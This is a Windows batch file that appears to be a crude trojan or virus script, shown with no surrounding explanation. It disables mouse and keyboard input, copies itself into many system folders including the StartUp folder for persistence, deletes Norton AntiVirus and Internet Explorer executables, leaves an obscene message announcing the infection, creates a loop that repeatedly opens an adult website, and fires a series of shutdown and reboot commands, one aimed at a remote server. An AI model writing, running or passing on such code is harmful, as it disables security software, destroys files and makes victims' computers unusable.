@ECHO off
C:\windows\rundll.exe mouse,disable
C:\windows\rundll.exe keyboard,disable
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\Desktop
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\System32
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\Cookies
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\Downloaded Program Files
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\Favorites
If not exist C:\KillerShelli.bat Copy %0 C:\WINDOWS\HELP
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\History
If not exist C:\CodeBlue.bat Copy %0 C:\WINDOWS\MEDIA
If not exist C:\CodeBlue.bat Copy %0 C:\WINDOWS\SYSTEM
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\SendTo
If not exist C:\CodeBlue.bat Copy %0 C:\WINDOWS\ShellNew
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\Start Menu
If not exist C:\Killer_Shelli.bat Copy %0 C:\WINDOWS\Start Menu\Programs\StartUp
Cd\
C:\Program Files\Norton  AntiVirus\
Del NAVAPW32.EXE
DEL Filter.dat
Cd\
C:\Program Files\Norton AntiVirus
Del C:\Program Files\Norton AntiVirus\NAVAPW32.EXE
Del C:\Program Files\Norton AntiVirus\Filter.dat
Cd\
C:\Program Files\Internet Explorer
Del Iexplore.exe
Del Dw15.exe
Cd\
C:\Program Files\Internet Explorer
Del C:\Program Files\Internet Explorer\Iexplore.exe
Del C:\Program Files\Internet Explorer\Dw15.exe
Cd
C:\Windows\Desktop
Echo Hello! What is your name? Anyway, Guess What? A Small Simple Trojan/Virus has Infected your Computer >Fuckme.txt
Echo :loop >Start.bat
Echo Start Iexplore www.sexnow.com >>Start.bat
Echo Goto loop >>Start.bat
ECHO G=FFFF:0000   DEBUG 
Start Reset.com
ECHO G=FFFF:0000   DEBUG 
RUNDLL USER.EXE,ExitWindows 
RUNDLL USER.EXE,ExitWindowsExec 
RUNDLL SHELL.DLL,RestartDialog 
RUNDLL32 KRNL386.EXE,exitkernel 
RUNONCE.EXE -q
RUNDLL32 USER32.DLL,ExitWindowsEx
RUNDLL32 USER32.DLL,ExitWindowsEx 
PSSHUTDOWN \\mynt4srv -K -F -T 20 

